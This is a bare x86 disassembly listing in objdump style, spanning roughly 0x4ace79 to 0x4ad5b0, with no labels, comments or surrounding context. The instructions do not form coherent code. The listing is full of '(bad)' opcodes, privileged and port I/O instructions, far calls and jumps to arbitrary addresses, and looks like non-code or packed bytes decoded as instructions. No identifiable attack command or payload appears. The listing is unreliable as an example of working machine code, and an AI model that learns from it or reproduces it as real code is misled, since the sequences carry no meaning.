  4ace79:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4ace7a:	pop    ebp
  4ace7b:	xor    DWORD PTR [ebx+0x1501010a],eax
  4ace81:	add    dh,BYTE PTR [edi+0x79]
  4ace84:	inc    ebx
  4ace85:	sar    BYTE PTR [ebx+eax*1],cl
  4ace88:	add    al,0x12
  4ace8a:	add    eax,0x63410906
  4ace8f:	aam    0x50
  4ace91:	pop    es
  4ace92:	jnp    0x4acf0c
  4ace94:	inc    edi
  4ace95:	sub    al,al
  4ace97:	enter  0x567d,0x15
  4ace9b:	mov    eax,ds:0x34132f80
  4acea0:	(bad)  
  4acea1:	addr16 jo 0x4acece
  4acea4:	adc    DWORD PTR [eax+0x75],edi
  4acea7:	adc    al,0x19
  4acea9:	mov    edi,eax
  4aceab:	push   edx
  4aceac:	dec    edi
  4acead:	sub    DWORD PTR [ecx+ebx*4],edx
  4aceb0:	adc    al,0x49
  4aceb2:	cmp    DWORD PTR [ecx+0x43],ecx
  4aceb5:	inc    ecx
  4aceb6:	mov    al,0xe9
  4aceb8:	add    DWORD PTR [ebp+0x4e9e321],edi
  4acebe:	jne    0x4acec7
  4acec0:	sbb    dl,BYTE PTR [eax-0x64bd796a]
  4acec6:	adc    bh,BYTE PTR [eax-0x17497f5b]
  4acecc:	js     0x4acf12
  4acece:	mov    BYTE PTR [edx],bh
  4aced0:	mov    DWORD PTR [eax+0x38],ebp
  4aced3:	add    DWORD PTR [ebx],eax
  4aced5:	mov    ah,0xe
  4aced7:	dec    edx
  4aced8:	inc    ecx
  4aced9:	lods   al,BYTE PTR ds:[esi]
  4aceda:	jl     0x4ace78
  4acedc:	push   es
  4acedd:	mov    edx,0x83f326d
  4acee2:	mov    al,BYTE PTR [ecx+0x9899948]
  4acee8:	mov    DWORD PTR [eax],ecx
  4aceea:	mov    DWORD PTR [edx+0x15d670a6],esi
  4acef0:	imul   esi,DWORD PTR [edx-0x4d],0xf0ba5bed
  4acef7:	nop
  4acef8:	cs ins DWORD PTR es:[edi],dx
  4acefa:	(bad)  
  4acefb:	pushf  
  4acefc:	push   ecx
  4acefd:	push   0xc147d933
  4acf02:	add    DWORD PTR [ebx+ecx*1],edx
  4acf05:	add    DWORD PTR [edx+edi*4+0x61],esi
  4acf09:	push   0x20
  4acf0b:	xor    BYTE PTR [edx+0x5d04c734],dl
  4acf11:	adc    bh,BYTE PTR [eax-0x98fa2f4]
  4acf17:	dec    esp
  4acf18:	popa   
  4acf19:	mov    ah,0x22
  4acf1b:	add    DWORD PTR [ecx+0x6e17413],ebp
  4acf21:	mov    al,0xb6
  4acf23:	mov    edx,0xd17f7b69
  4acf28:	aam    0x56
  4acf2a:	push   edx
  4acf2b:	pop    ds
  4acf2c:	rcr    BYTE PTR [ecx+ebx*2-0x2b2f7b0],1
  4acf33:	ret    
  4acf34:	mov    cl,BYTE PTR [ecx+edx*1-0x6f7d77a2]
  4acf3b:	in     eax,dx
  4acf3c:	sbb    DWORD PTR [esi+0x1427401a],esp
  4acf42:	std    
  4acf43:	mov    eax,ds:0x35d9a4a4
  4acf48:	cld    
  4acf49:	mov    cl,0xc
  4acf4b:	inc    esp
  4acf4c:	push   edx
  4acf4d:	push   0xe09f3568
  4acf52:	or     al,0x93
  4acf54:	out    0x37,al
  4acf56:	pop    ss
  4acf57:	sbb    DWORD PTR ds:[edx+edx*1-0x73],esi
  4acf5c:	push   ebp
  4acf5d:	or     BYTE PTR [eax+eax*4],cl
  4acf60:	mov    ebx,0x1b0c9849
  4acf65:	imul   ebx,DWORD PTR [ebx],0xa81dcf8
  4acf6b:	push   0xbd6d669d
  4acf70:	and    DWORD PTR [ecx+0x6c],esp
  4acf73:	jo     0x4acf28
  4acf75:	dec    ebx
  4acf76:	sahf   
  4acf77:	and    DWORD PTR [edx],0xffffffd6
  4acf7a:	mov    bl,0x43
  4acf7c:	mov    dl,0x99
  4acf7e:	push   edi
  4acf7f:	jo     0x4acf51
  4acf81:	dec    edx
  4acf82:	xchg   esp,eax
  4acf83:	fucomp st(4)
  4acf85:	jns    0x4acf07
  4acf87:	ret    
  4acf88:	push   esi
  4acf89:	and    bh,BYTE PTR [eax-0x75]
  4acf8c:	outs   dx,BYTE PTR ds:[esi]
  4acf8d:	add    DWORD PTR [ecx-0x34f8d3b8],ecx
  4acf93:	cdq    
  4acf94:	js     0x4acfbc
  4acf96:	inc    eax
  4acf97:	push   es
  4acf98:	aam    0x6c
  4acf9a:	pop    ebx
  4acf9b:	add    al,0x20
  4acf9d:	jno    0x4acf31
  4acf9f:	scas   eax,DWORD PTR es:[edi]
  4acfa0:	cmp    al,0x48
  4acfa2:	sbb    dl,BYTE PTR [edx+0x6]
  4acfa5:	and    al,0xec
  4acfa7:	sub    al,0x34
  4acfa9:	jle    0x4acf55
  4acfab:	inc    esp
  4acfac:	push   0xc
  4acfae:	mov    BYTE PTR [ebp+0x2f],0x4c
  4acfb2:	sub    ebp,edx
  4acfb4:	add    DWORD PTR [edx+0x5],ebp
  4acfb7:	xchg   edx,eax
  4acfb8:	call   0x168:0xd07d2c2e
  4acfbf:	mov    bh,0x81
  4acfc1:	jno    0x4ad031
  4acfc3:	fldenv [esi]
  4acfc5:	push   ss
  4acfc6:	xor    al,0xd1
  4acfc8:	sub    al,0xbb
  4acfca:	data16 and al,0xe8
  4acfcd:	out    dx,eax
  4acfce:	or     ch,BYTE PTR [esi+0x7]
  4acfd1:	push   eax
  4acfd2:	add    DWORD PTR [ebx-0x12d5ef0d],eax
  4acfd8:	jle    0x4ad01c
  4acfda:	mov    dh,0xe6
  4acfdc:	and    BYTE PTR [esi+0x2424165c],dl
  4acfe2:	inc    esp
  4acfe3:	xor    bh,BYTE PTR [esi-0x2785108c]
  4acfe9:	aam    0xc
  4acfeb:	mov    al,0xf
  4acfed:	sbb    al,0x90
  4acfef:	in     al,0x16
  4acff1:	xchg   ecx,eax
  4acff2:	sbb    eax,0xe4c24b0e
  4acff7:	mov    edi,0x48cc043f
  4acffc:	add    BYTE PTR [ebx+0x52],dl
  4acfff:	pop    eax
  4ad000:	mov    al,ds:0x2881aea2
  4ad005:	ins    BYTE PTR es:[edi],dx
  4ad006:	push   es
  4ad007:	je     0x4ad01c
  4ad009:	test   BYTE PTR [esi+ebx*1],ah
  4ad00c:	fmul   st,st(4)
  4ad00e:	push   0x6b508f36
  4ad013:	data16 jnp 0x4acf99
  4ad016:	retf   
  4ad017:	mov    ds:0xcf275306,al
  4ad01c:	xor    dh,BYTE PTR [ecx+0x65]
  4ad01f:	sbb    esp,DWORD PTR [edi]
  4ad021:	mov    ecx,0xfe1d0926
  4ad026:	push   ss
  4ad027:	das    
  4ad028:	push   edx
  4ad029:	mov    dh,0x8c
  4ad02b:	shr    BYTE PTR [eax-0x2],cl
  4ad02e:	call   0x65cf9d54
  4ad033:	mov    esi,ss
  4ad035:	punpcklbw mm0,DWORD PTR [ebp+0x5810a9e0]
  4ad03c:	xchg   ecx,eax
  4ad03d:	xor    al,0xf0
  4ad03f:	fisubr WORD PTR [ecx+0x6d]
  4ad042:	and    al,0x52
  4ad044:	push   ebp
  4ad045:	cmp    DWORD PTR [ecx+0x706de3ee],ebp
  4ad04b:	lea    ecx,[ebp+0x44c9511f]
  4ad051:	cmp    eax,0x68177602
  4ad056:	and    ah,dh
  4ad058:	mov    ebx,eax
  4ad05a:	ins    BYTE PTR es:[edi],dx
  4ad05b:	push   cs
  4ad05c:	mov    al,0x64
  4ad05e:	mov    ebp,0x4862672b
  4ad063:	xchg   ebx,eax
  4ad064:	or     ah,dl
  4ad066:	push   edi
  4ad067:	int    0x5b
  4ad069:	ret    0x134f
  4ad06c:	xchg   edx,eax
  4ad06d:	sti    
  4ad06e:	push   esp
  4ad06f:	add    al,0x55
  4ad071:	mov    DWORD PTR [esp+ecx*8+0x47b4f5f7],0x96dc6132
  4ad07c:	xor    BYTE PTR [eax+0x48],0x5f
  4ad080:	xchg   esp,eax
  4ad081:	pop    ebp
  4ad082:	outs   dx,DWORD PTR ds:[esi]
  4ad083:	and    DWORD PTR [eax+eiz*1+0x49e79036],eax
  4ad08a:	jnp    0x4ad09f
  4ad08c:	aam    0xf6
  4ad08e:	cld    
  4ad08f:	aaa    
  4ad090:	mov    esi,0xcc90c48c
  4ad095:	and    esp,DWORD PTR [ecx]
  4ad097:	mov    fs,WORD PTR [ecx+0x48]
  4ad09a:	dec    edx
  4ad09b:	ins    DWORD PTR es:[edi],dx
  4ad09c:	and    dl,BYTE PTR ds:0x7284f961
  4ad0a2:	jne    0x4ad0ea
  4ad0a4:	sub    BYTE PTR [ecx+0x2761fd09],bh
  4ad0aa:	xor    bl,bl
  4ad0ac:	jns    0x4ad0f7
  4ad0ae:	inc    ebx
  4ad0af:	sub    dl,BYTE PTR [edi]
  4ad0b1:	jo     0x4ad0ea
  4ad0b3:	add    BYTE PTR [eax-0x30],ch
  4ad0b6:	out    dx,al
  4ad0b7:	dec    ebx
  4ad0b8:	mov    DWORD PTR [edi],0x1b30d35
  4ad0be:	outs   dx,BYTE PTR ds:[esi]
  4ad0bf:	jmp    DWORD PTR [ecx]
  4ad0c1:	in     eax,dx
  4ad0c2:	and    BYTE PTR [ebx+0x1c637a47],dh
  4ad0c8:	push   DWORD PTR [edi-0x2a734bd3]
  4ad0ce:	adc    cl,BYTE PTR [ebp+0x1c]
  4ad0d1:	sbb    ah,BYTE PTR [eax]
  4ad0d3:	call   DWORD PTR [ecx]
  4ad0d5:	cmp    al,0xcf
  4ad0d7:	in     eax,0x45
  4ad0d9:	and    BYTE PTR [ebp+0x20],dh
  4ad0dc:	sbb    al,0x18
  4ad0de:	adc    al,0x92
  4ad0e0:	push   ds
  4ad0e1:	push   cs
  4ad0e2:	repnz sub al,ch
  4ad0e5:	retf   
  4ad0e6:	add    al,0x56
  4ad0e8:	push   ebx
  4ad0e9:	sbb    al,0x90
  4ad0eb:	dec    edi
  4ad0ec:	mov    ch,0x7
  4ad0ee:	cmp    DWORD PTR [esi-0x5b92ece9],0x42
  4ad0f5:	or     DWORD PTR [ebx+0x70],eax
  4ad0f8:	aaa    
  4ad0f9:	jne    0x4ad136
  4ad0fb:	cmp    BYTE PTR [esi+0x23b23ab0],al
  4ad101:	mov    ecx,DWORD PTR [edi]
  4ad103:	sbb    dl,BYTE PTR [ecx]
  4ad105:	push   0xd9c69092
  4ad10a:	adc    cl,al
  4ad10c:	loopne 0x4ad15a
  4ad10e:	adc    bl,BYTE PTR [edi+0x3410d17]
  4ad114:	rcl    BYTE PTR [edx+0x5],cl
  4ad117:	pop    eax
  4ad118:	push   edx
  4ad119:	adc    bh,BYTE PTR [eax]
  4ad11b:	adc    dl,al
  4ad11d:	jnp    0x4ad154
  4ad11f:	dec    esp
  4ad120:	pop    esi
  4ad121:	and    eax,DWORD PTR [ebp+0x20ff5325]
  4ad127:	inc    ebx
  4ad128:	or     bh,BYTE PTR [edx+0x5020b090]
  4ad12e:	mov    bh,0x74
  4ad130:	push   ds
  4ad131:	or     DWORD PTR [edi+0xc],0xa
  4ad135:	fs lahf 
  4ad137:	sbb    al,0x6a
  4ad139:	fcomp  DWORD PTR [esi+edi*4]
  4ad13c:	rol    BYTE PTR [esi+0x1bc0a61],cl
  4ad142:	xchg   esp,eax
  4ad144:	les    esp,FWORD PTR [ecx+ebp*2]
  4ad147:	inc    edi
  4ad148:	std    
  4ad149:	and    al,0x9
  4ad14b:	sub    al,0x98
  4ad14d:	pop    ecx
  4ad14e:	or     DWORD PTR [eax],0xe19837b
  4ad154:	aas    
  4ad155:	loop   0x4ad1cc
  4ad157:	popa   
  4ad158:	xchg   edi,eax
  4ad159:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4ad15a:	xchg   ecx,eax
  4ad15b:	xchg   edx,eax
  4ad15c:	adc    al,bl
  4ad15e:	mov    dl,0x4
  4ad160:	push   eax
  4ad161:	jne    0x4ad193
  4ad163:	jo     0x4ad1bd
  4ad165:	test   DWORD PTR [ecx],ebx
  4ad167:	outs   dx,BYTE PTR ds:[esi]
  4ad168:	xor    dh,BYTE PTR [eax]
  4ad16a:	in     al,dx
  4ad16b:	lock aam 0x5f
  4ad16e:	push   ebx
  4ad16f:	push   edi
  4ad170:	arpl   ax,cx
  4ad172:	push   es
  4ad173:	das    
  4ad174:	adc    cl,BYTE PTR [eax-0x69]
  4ad177:	imul   edi,DWORD PTR [eax+0x660ddf7a],0x64206a60
  4ad181:	push   ecx
  4ad182:	add    BYTE PTR [edi-0x40],dl
  4ad185:	jno    0x4ad194
  4ad187:	ins    DWORD PTR es:[edi],dx
  4ad188:	pop    edi
  4ad189:	cld    
  4ad18a:	adc    BYTE PTR [edx],cl
  4ad18c:	or     ecx,DWORD PTR [ecx-0x51]
  4ad18f:	ret    
  4ad190:	and    eax,0xef0b9024
  4ad195:	pop    edx
  4ad196:	and    ecx,ebp
  4ad198:	int3   
  4ad199:	cwde   
  4ad19a:	add    BYTE PTR ds:0x48117045,cl
  4ad1a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4ad1a1:	dec    eax
  4ad1a2:	mov    ebp,0xc038e943
  4ad1a7:	sbb    BYTE PTR [ecx+0x322133d],al
  4ad1ad:	pop    edx
  4ad1ae:	push   es
  4ad1af:	xor    al,BYTE PTR [ebx+0x24216d04]
  4ad1b5:	add    al,0x2
  4ad1b7:	mov    ch,0x72
  4ad1b9:	inc    edx
  4ad1ba:	shr    BYTE PTR [eax],cl
  4ad1bc:	push   ss
  4ad1bd:	fsub   QWORD PTR [ecx+0x6c]
  4ad1c0:	and    BYTE PTR [ecx-0x5b],al
  4ad1c3:	add    BYTE PTR [eax-0x5a519aad],ch
  4ad1c9:	or     ebp,DWORD PTR [esi+0x145f19e4]
  4ad1cf:	dec    BYTE PTR [eax]
  4ad1d1:	jo     0x4ad167
  4ad1d3:	xor    al,0x66
  4ad1d5:	pop    ds
  4ad1d6:	out    dx,al
  4ad1d7:	xchg   ecx,eax
  4ad1d8:	inc    edx
  4ad1d9:	loopne 0x4ad15b
  4ad1db:	rol    DWORD PTR [edx],1
  4ad1dd:	add    DWORD PTR [edi],0xfffffff2
  4ad1e0:	lahf   
  4ad1e1:	sbb    BYTE PTR [eax+ecx*8+0x14],dh
  4ad1e5:	lock cmp DWORD PTR [edi+0x3b0b8f62],0xa1b47508
  4ad1f0:	lock shr DWORD PTR [eax+0x60],cl
  4ad1f4:	aam    0xc5
  4ad1f6:	add    esi,DWORD PTR [ebp-0x63]
  4ad1f9:	mov    DWORD PTR [edi],esi
  4ad1fb:	in     eax,0xc9
  4ad1fd:	inc    eax
  4ad1fe:	cmp    dh,BYTE PTR ds:0x478550ba
  4ad204:	or     DWORD PTR [edx],ecx
  4ad206:	je     0x4ad273
  4ad208:	pusha  
  4ad209:	mov    eax,ds:0x2822158d
  4ad20e:	add    DWORD PTR [eax+0x61c305d3],eax
  4ad214:	add    eax,0x2914e7d7
  4ad219:	or     ecx,esi
  4ad21b:	adc    al,0x5c
  4ad21d:	sub    bh,ah
  4ad21f:	add    ebx,edx
  4ad221:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4ad222:	rcl    ecx,cl
  4ad224:	loop   0x4ad1fe
  4ad226:	cmp    esi,0xffffffb1
  4ad229:	test   BYTE PTR [eax-0x69ec5af0],0x33
  4ad230:	setg   BYTE PTR [ecx-0x2c]
  4ad234:	retf   
  4ad235:	and    ah,bl
  4ad237:	ret    
  4ad238:	push   0x345256c2
  4ad23d:	mov    eax,DWORD PTR [eax+0x0]
  4ad240:	std    
  4ad241:	mov    ds:0x5d60e84,eax
  4ad246:	jno    0x4ad21e
  4ad248:	xor    BYTE PTR [eax+0x57],cl
  4ad24b:	sub    eax,0x48b81fd1
  4ad250:	sub    eax,DWORD PTR fs:[esi]
  4ad253:	xchg   ecx,eax
  4ad254:	jns    0x4ad2c4
  4ad256:	mov    ds:0x680a1ac2,eax
  4ad25b:	adc    al,0x51
  4ad25d:	add    eax,0x1c8c90a4
  4ad262:	mov    edx,0x8ec77757
  4ad267:	sub    DWORD PTR [ebx],esp
  4ad269:	sub    bl,ch
  4ad26b:	loope  0x4ad26c
  4ad26d:	sbb    eax,eax
  4ad26f:	add    BYTE PTR ds:0x921dff55,0x6
  4ad276:	rol    BYTE PTR [eax+0x574452e7],cl
  4ad27c:	(bad)  
  4ad27d:	ret    0xce0c
  4ad280:	shl    BYTE PTR [ebx],cl
  4ad282:	scas   eax,DWORD PTR es:[edi]
  4ad283:	push   ecx
  4ad284:	push   0x41a44240
  4ad289:	idiv   bh
  4ad28b:	cmp    eax,0x9aec3918
  4ad290:	push   es
  4ad291:	and    DWORD PTR [ecx],ecx
  4ad293:	add    al,0xe
  4ad295:	xchg   ebp,eax
  4ad296:	add    ch,BYTE PTR [ecx-0x26]
  4ad299:	and    bh,0x1a
  4ad29c:	push   ecx
  4ad29d:	push   ss
  4ad29e:	mov    ebx,DWORD PTR [esi+0x4]
  4ad2a1:	push   edx
  4ad2a2:	and    BYTE PTR [ebx+0x21],ch
  4ad2a5:	dec    ecx
  4ad2a6:	adc    eax,0x60525904
  4ad2ab:	inc    esi
  4ad2ac:	mov    cs,WORD PTR [ebx+0x5e884eb9]
  4ad2b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4ad2b3:	popa   
  4ad2b4:	inc    edx
  4ad2b5:	sbb    al,0x28
  4ad2b7:	push   ecx
  4ad2b8:	sub    al,0xef
  4ad2ba:	sub    dl,BYTE PTR [edi]
  4ad2bc:	je     0x4ad316
  4ad2be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4ad2bf:	enter  0x9d0e,0xfe
  4ad2c3:	test   BYTE PTR [edi],0x16
  4ad2c6:	mov    eax,0x51181c5c
  4ad2cb:	(bad)  
  4ad2cc:	xchg   edx,eax
  4ad2cd:	xor    al,0xc9
  4ad2cf:	ret    
  4ad2d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4ad2d1:	lods   eax,DWORD PTR ds:[esi]
  4ad2d2:	loop   0x4ad327
  4ad2d4:	sbb    ebp,DWORD PTR [eax+0x67ad7d24]
  4ad2da:	xor    dl,BYTE PTR [edx-0x75]
  4ad2dd:	mov    dh,0xa1
  4ad2df:	add    al,0xb8
  4ad2e1:	enter  0xa16b,0xd2
  4ad2e5:	push   cs
  4ad2e6:	mov    al,ds:0x240e5f04
  4ad2eb:	and    al,0x74
  4ad2ed:	lea    esp,[edx]
  4ad2ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4ad2f0:	retf   
  4ad2f1:	add    BYTE PTR [ebx],al
  4ad2f3:	xor    al,0x76
  4ad2f5:	and    al,0x8
  4ad2f7:	call   0xf04b5b96
  4ad2fc:	dec    ecx
  4ad2fd:	adc    edx,DWORD PTR [edx+0x71]
  4ad300:	enter  0xf4ae,0x24
  4ad304:	invd   
  4ad306:	or     DWORD PTR [esi],edx
  4ad308:	push   es
  4ad309:	dec    ebp
  4ad30a:	and    bl,BYTE PTR [esi+0x654d249d]
  4ad310:	pop    ss
  4ad311:	iret   
  4ad312:	jae    0x4ad315
  4ad314:	lock loopne 0x4ad32d
  4ad317:	sbb    DWORD PTR [eax-0x7d],0x33
  4ad31b:	int    0x91
  4ad31d:	add    eax,0x210c8032
  4ad322:	or     BYTE PTR [ecx],ah
  4ad324:	add    eax,DWORD PTR [esi+0x6ae924c2]
  4ad32a:	in     al,dx
  4ad32b:	push   eax
  4ad32c:	sbb    DWORD PTR [ecx+eax*8],ebp
  4ad32f:	rol    BYTE PTR [eax+0x5d700bb5],1
  4ad335:	xchg   edx,eax
  4ad336:	push   es
  4ad337:	js     0x4ad2ee
  4ad339:	fcomp  QWORD PTR [edx-0x3f741d33]
  4ad33f:	xchg   BYTE PTR [ebx-0x13],dl
  4ad342:	sbb    esp,esp
  4ad344:	mov    edx,0xd720eb86
  4ad349:	add    BYTE PTR [edi+edx*8],ch
  4ad34c:	mov    ss,WORD PTR [ebx]
  4ad34e:	jo     0x4ad37c
  4ad350:	fs (bad) 
  4ad353:	mov    ebp,0xcbd7e5c
  4ad358:	fcmovne st,st(3)
  4ad35a:	sbb    al,0x18
  4ad35c:	sub    al,0x51
  4ad35e:	inc    edx
  4ad35f:	scas   eax,DWORD PTR es:[edi]
  4ad360:	sbb    DWORD PTR ds:0x50cb0469,esp
  4ad366:	dec    eax
  4ad367:	jae    0x4ad3a5
  4ad369:	pusha  
  4ad36a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4ad36b:	test   edi,edi
  4ad36d:	and    DWORD PTR [esp+ecx*1+0x9],esi
  4ad371:	jmp    0x4ad393
  4ad373:	sbb    ch,al
  4ad375:	push   cs
  4ad376:	inc    eax
  4ad377:	sub    al,0x3d
  4ad379:	or     DWORD PTR [eax],edx
  4ad37b:	sbb    DWORD PTR [ebx],ebp
  4ad37d:	sbb    ebx,DWORD PTR [esi]
  4ad37f:	aas    
  4ad380:	mov    edx,0x7fbf046a
  4ad385:	inc    edx
  4ad386:	mov    al,0x5a
  4ad388:	add    DWORD PTR [ebp-0x45],ebp
  4ad38b:	loope  0x4ad395
  4ad38d:	retf   0x215b
  4ad390:	dec    ebp
  4ad391:	loopne 0x4ad3e4
  4ad393:	push   edx
  4ad394:	call   0xf4fba3a9
  4ad399:	sbb    BYTE PTR [eax+0x44f1106f],bl
  4ad39f:	arpl   WORD PTR [eax],bp
  4ad3a1:	ret    0x4b56
  4ad3a4:	sub    cl,cl
  4ad3a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4ad3a7:	or     BYTE PTR [ebx],bl
  4ad3a9:	lahf   
  4ad3aa:	dec    esp
  4ad3ab:	sub    al,0x4
  4ad3ad:	sbb    DWORD PTR [eax-0x53ce951e],esi
  4ad3b3:	cmp    edi,eax
  4ad3b5:	test   al,0xfc
  4ad3b7:	ret    0xc91
  4ad3ba:	iret   
  4ad3bb:	stos   DWORD PTR es:[edi],eax
  4ad3bc:	enter  0xf570,0xd2
  4ad3c0:	repnz inc ebp
  4ad3c2:	push   edx
  4ad3c3:	imul   esp,esp,0xffffffb9
  4ad3c6:	cmp    dh,BYTE PTR [edx+0x181c6a89]
  4ad3cc:	mov    ah,0xa
  4ad3ce:	ss popf 
  4ad3d0:	loopne 0x4ad39c
  4ad3d2:	pop    ss
  4ad3d3:	inc    DWORD PTR [esi+0x29]
  4ad3d6:	and    al,0xfc
  4ad3d8:	data16 and bl,0x8
  4ad3dc:	int3   
  4ad3dd:	push   0x70801707
  4ad3e2:	jbe    0x4ad375
  4ad3e4:	popf   
  4ad3e5:	fadd   DWORD PTR [ebp+0x550695c9]
  4ad3eb:	lock push edx
  4ad3ed:	fldcw  WORD PTR [ecx]
  4ad3ef:	imul   esi,DWORD PTR [eax+0xc],0x4ea502ab
  4ad3f6:	ins    DWORD PTR es:[edi],dx
  4ad3f7:	cdq    
  4ad3f8:	and    cl,BYTE PTR [edx+0x59]
  4ad3fb:	and    al,0x52
  4ad3fd:	mov    al,ds:0x11e2ab03
  4ad402:	mov    DWORD PTR gs:[eax+0x11],eax
  4ad406:	cmp    al,dh
  4ad408:	dec    ebp
  4ad409:	enter  0x9575,0x80
  4ad40d:	and    eax,0x5357e407
  4ad412:	ror    dl,1
  4ad414:	call   0x9291:0x1560e30
  4ad41b:	je     0x4ad46e
  4ad41d:	fiadd  DWORD PTR [ebp-0x7f89aedf]
  4ad423:	pop    ebp
  4ad424:	and    esp,eax
  4ad426:	test   eax,0x7018693
  4ad42b:	jmp    0x8eb8728
  4ad430:	sub    ch,BYTE PTR [ebp-0x65e4fa57]
  4ad436:	sahf   
  4ad437:	fidiv  DWORD PTR [eax+0x1d142ae4]
  4ad43d:	in     eax,0x35
  4ad43f:	mov    BYTE PTR [edx+ecx*1],ah
  4ad442:	mov    eax,ds:0x51da2440
  4ad447:	das    
  4ad448:	sbb    al,0x7c
  4ad44a:	mov    ch,0x8d
  4ad44c:	add    eax,0x9560a5be
  4ad451:	mov    ds:0xd4b1709,eax
  4ad456:	and    BYTE PTR [ecx+edi*2],bl
  4ad459:	cs mov al,0x6
  4ad45c:	test   eax,0xbcabd218
  4ad461:	push   esi
  4ad462:	ds loopne 0x4ad465
  4ad465:	cmp    DWORD PTR [edi],eax
  4ad467:	pop    ds
  4ad468:	mov    edi,0x643f2151
  4ad46d:	add    edx,DWORD PTR [eax+0x68000143]
  4ad473:	dec    esi
  4ad474:	add    DWORD PTR [ecx],edx
  4ad476:	test   eax,0x2003960
  4ad47b:	jge    0x4ad44d
  4ad47d:	mov    cl,0xe9
  4ad47f:	push   cs
  4ad480:	popf   
  4ad481:	sub    al,0xad
  4ad483:	scas   al,BYTE PTR es:[edi]
  4ad484:	or     DWORD PTR [ebp+0x7f],ecx
  4ad487:	jo     0x4ad4d8
  4ad489:	jae    0x4ad40b
  4ad48b:	jle    0x4ad4f6
  4ad48d:	jb     0x4ad424
  4ad48f:	mov    BYTE PTR [esi+0x69],0x1
  4ad493:	lods   eax,DWORD PTR ds:[esi]
  4ad494:	aam    0x84
  4ad496:	dec    esp
  4ad497:	mov    WORD PTR [ecx+0x1],ss
  4ad49a:	adc    al,0x19
  4ad49c:	jns    0x4ad44e
  4ad49e:	inc    eax
  4ad49f:	fsubr  DWORD PTR [eax-0x54]
  4ad4a2:	pusha  
  4ad4a3:	push   edi
  4ad4a4:	push   esi
  4ad4a5:	add    eax,edx
  4ad4a7:	inc    esi
  4ad4a8:	dec    eax
  4ad4a9:	add    ebp,DWORD PTR ds:0x41811c8c
  4ad4af:	test   al,0x27
  4ad4b1:	mov    eax,0x86261343
  4ad4b6:	nop
  4ad4b7:	popf   
  4ad4b8:	add    edi,esi
  4ad4ba:	sub    DWORD PTR [eax+0xc],ebx
  4ad4bd:	iret   
  4ad4be:	pop    es
  4ad4bf:	add    ebp,DWORD PTR [ebx-0x7dbc09e8]
  4ad4c5:	inc    ebx
  4ad4c6:	or     al,BYTE PTR [edx-0x7d427ee1]
  4ad4cc:	adc    eax,0x471ddb58
  4ad4d1:	dec    eax
  4ad4d2:	mov    ch,BYTE PTR [esi]
  4ad4d4:	xor    BYTE PTR [ebx+esi*2],dl
  4ad4d7:	dec    edi
  4ad4d8:	dec    ebx
  4ad4d9:	ins    DWORD PTR es:[edi],dx
  4ad4da:	cmp    bl,0x35
  4ad4dd:	sbb    DWORD PTR [ecx+esi*8],ebp
  4ad4e0:	pop    es
  4ad4e1:	push   esp
  4ad4e2:	(bad)  
  4ad4e4:	push   es
  4ad4e5:	adc    BYTE PTR ds:0xe1ab2b5b,cl
  4ad4eb:	call   0x51a9f1a4
  4ad4f0:	rol    DWORD PTR [ebx-0x16],0xc0
  4ad4f4:	inc    esi
  4ad4f5:	dec    eax
  4ad4f6:	jg     0x4ad549
  4ad4f8:	xor    eax,0x1189a0b8
  4ad4fd:	pop    ebp
  4ad4fe:	xor    DWORD PTR [ecx-0x63206699],ecx
  4ad504:	call   0xfbbc25f5
  4ad509:	jmp    0x4ad528
  4ad50b:	call   DWORD PTR [ecx+0x7e]
  4ad50e:	cmp    BYTE PTR [esi+0x24],0x17
  4ad512:	rol    DWORD PTR [edx+0x4914893f],0x2
  4ad519:	dec    ecx
  4ad51a:	push   cs
  4ad51b:	and    al,0x4d
  4ad51d:	push   eax
  4ad51e:	and    eax,0x5bfd7838
  4ad523:	mov    cs,WORD PTR [edi+0x11b0e18a]
  4ad529:	pop    ss
  4ad52a:	cmp    al,0xc0
  4ad52c:	adc    BYTE PTR [eax],dh
  4ad52e:	cmp    eax,0x37eb9c37
  4ad533:	push   cs
  4ad534:	and    al,0x7d
  4ad536:	sbb    ah,BYTE PTR [esi+0x40]
  4ad539:	push   ss
  4ad53a:	push   eax
  4ad53b:	loope  0x4ad4bf
  4ad53d:	sbb    bl,BYTE PTR [edi+0x6]
  4ad540:	pop    ss
  4ad541:	mov    esi,DWORD PTR [eax+0x71c1eba2]
  4ad547:	add    al,0x5d
  4ad549:	stos   BYTE PTR es:[edi],al
  4ad54a:	enter  0x37c1,0xf4
  4ad54e:	or     BYTE PTR [esp+ebp*1-0x5c],bh
  4ad552:	push   edx
  4ad553:	ins    BYTE PTR es:[edi],dx
  4ad554:	and    DWORD PTR [ecx+eiz*2+0x7a],ebx
  4ad558:	jno    0x4ad512
  4ad55a:	adc    eax,0xeb0f68ab
  4ad55f:	repnz add esp,DWORD PTR [ecx]
  4ad562:	psrad  mm7,mm3
  4ad565:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4ad566:	lods   eax,DWORD PTR ds:[esi]
  4ad567:	add    DWORD PTR [ebp+0x900d02],edx
  4ad56d:	pop    edx
  4ad56e:	sub    al,0x10
  4ad570:	inc    ecx
  4ad571:	add    ah,BYTE PTR [ebx+0x2b70eb08]
  4ad577:	push   ss
  4ad578:	push   0x1f044be
  4ad57d:	xchg   DWORD PTR [esi+ebp*4-0x24d4a6bd],eax
  4ad584:	sbb    DWORD PTR [ecx+0x1c72ac66],0x14
  4ad58b:	push   eax
  4ad58c:	jmp    0xf0598161
  4ad591:	lea    eax,[ebx]
  4ad593:	sub    ah,cl
  4ad595:	adc    ebx,edx
  4ad597:	dec    ecx
  4ad598:	test   DWORD PTR [edx+0x69119621],ecx
  4ad59e:	inc    ebp
  4ad59f:	(bad)  
  4ad5a0:	lock xchg BYTE PTR [eax+0x38094157],bh
  4ad5a7:	ret    
  4ad5a8:	dec    eax
  4ad5a9:	jne    0x4ad570
  4ad5ab:	repz adc al,0xe
  4ad5ae:	sbb    esp,DWORD PTR [eax]
  4ad5b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
